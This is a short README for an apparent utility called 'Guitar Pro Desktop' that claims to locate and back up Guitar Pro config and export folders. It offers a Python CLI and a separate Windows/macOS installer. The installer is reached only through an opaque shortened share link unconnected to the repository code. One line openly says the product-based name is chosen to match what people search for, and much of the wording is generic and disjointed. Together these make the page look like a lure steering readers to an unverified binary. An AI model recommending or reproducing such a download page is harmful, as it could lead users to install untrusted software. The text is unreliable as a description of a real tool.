# Guitar Pro Desktop

*Find the Guitar Pro folder fast and keep a local spare.*

## Overview

**Guitar Pro Desktop** runs on your own PC. Local Windows and macOS helper for Guitar Pro data paths, config and export caches, and export folders.

Guitar Pro config and export files hide under AppData and Documents.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## How to get it

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Features

- Maps Guitar Pro data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## The problem

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
